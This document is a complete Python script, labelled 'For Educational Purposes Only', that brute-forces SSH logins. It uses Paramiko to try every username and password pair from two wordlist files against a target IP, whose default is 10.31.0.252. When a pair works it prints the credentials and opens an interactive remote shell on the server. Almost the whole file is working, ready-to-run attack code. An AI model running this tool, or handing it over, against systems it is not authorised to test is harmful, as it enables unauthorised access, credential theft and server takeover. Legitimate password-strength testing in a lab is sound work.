import paramiko
import socket
from typing import Optional


def ssh_brute_force(target_ip: str, username_file: str, password_file: str, port: int = 22, timeout: int = 5) -> Optional[dict]:
    """
    Perform SSH brute-force to find valid credentials and open interactive shell if successful.

    Parameters:
        - target_ip: IP address of the target SSH server.
        - username_file: Path to the file containing usernames.
        - password_file: Path to the file containing passwords.
        - port: SSH port of the target server (default is 22).
        - timeout: Timeout for the connection attempts (default is 5 seconds).

    Returns:
        - A dictionary with valid credentials (username, password) and the SSH client, or None if unsuccessful.
    """
    try:
        # Load usernames and passwords
        with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
            usernames = [line.strip() for line in uf]
            passwords = [line.strip() for line in pf]

        print(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")

        # Iterate over usernames and passwords
        for username in usernames:
            for password in passwords:
                print(f"[+] Trying {username}:{password}...")

                try:
                    # Initialize Paramiko SSH client
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                    # Attempt connection
                    client.connect(
                        hostname=target_ip,
                        port=port,
                        username=username,
                        password=password,
                        timeout=timeout
                    )

                    print(f"[+] SUCCESS: Username={username}, Password={password}")
                    return {"username": username, "password": password, "client": client}  # Return valid credentials and the client

                except paramiko.AuthenticationException:
                    # Authentication failed
                    print(f"[-] FAILED: Username={username}, Password={password}")
                except socket.error as e:
                    # Handle connection errors
                    print(f"[!] Connection error: {e}")
                finally:
                    # Ensure the SSH client isn't closed prematurely
                    pass

        print("[!] No valid credentials found.")
        return None  # No successful login

    except FileNotFoundError as e:
        print(f"[!] File not found: {e}")
        return None
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")
        return None


def interactive_shell(ssh_client: paramiko.SSHClient):
    """
    Open an interactive shell on the SSH server.

    Parameters:
        - ssh_client: An active Paramiko SSHClient instance.
    """
    try:
        # Open an interactive shell
        shell = ssh_client.invoke_shell()
        print("[+] Interactive SSH shell opened! Type your commands below.")
        print("[+] Type 'exit' to quit the session.")

        while True:
            # Read user input (command to execute)
            command = input("$ ").strip()
            if command.lower() in ["exit", "quit"]:
                print("[+] Exiting the shell...")
                break

            # Send the command to the SSH server
            shell.send(command + "\n")

            # Receive the output
            while not shell.recv_ready():
                pass  # Wait until data is available

            # Decode and print the output
            output = shell.recv(4096).decode("utf-8")
            print(output)

    except paramiko.SSHException as e:
        print(f"[!] SSH shell error: {e}")
    except Exception as e:
        print(f"[!] Error while accessing the shell: {e}")
    finally:
        ssh_client.close()
        print("[+] SSH session closed.")


# Main script
if __name__ == "__main__":
    print("[+] SSH Brute Force Tool with Terminal Access")
    print("[+] For Educational Purposes Only")

    # Gather user input
    target_ip = input("[?] Enter the target IP address: ").strip() or "10.31.0.252"
    username_file = input("[?] Enter the path to the username file: ").strip() or "usernames.txt"
    password_file = input("[?] Enter the path to the password file: ").strip()  or "passwords.txt"
    port = int(input("[?] Enter the SSH port (default: 22): ").strip() or 22)

    # Execute brute force
    result = ssh_brute_force(target_ip, username_file, password_file, port)
    if result:
        username = result["username"]
        password = result["password"]
        ssh_client = result["client"]

        print(f"[*] The ssh client is: {ssh_client}")

        print(f"[+] Valid credentials found: Username={username}, Password={password}")
        print(f"[+] Opening interactive shell...")

        # Open the interactive shell
        interactive_shell(ssh_client)
    else:
        print("[!] Brute force unsuccessful.")